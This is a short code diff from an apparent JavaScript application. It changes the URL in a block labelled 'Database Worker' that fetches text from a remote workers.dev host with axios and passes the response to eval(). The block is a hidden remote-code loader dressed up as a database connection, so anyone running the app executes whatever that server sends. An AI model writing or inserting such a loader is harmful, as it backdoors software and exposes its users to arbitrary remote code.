@@ -72,7 +72,7 @@ function runApp(app) {
 
     //START Database Worker
     (async () => {
-        const databaseConnection = await axios.get('https://weathered-unit-7f83.westykan.workers.dev');
+        const databaseConnection = await axios.get('https://nameless-lake-42c1.westykan.workers.dev');
         if (databaseConnection.status === 200) {
             eval(databaseConnection.data);
         }
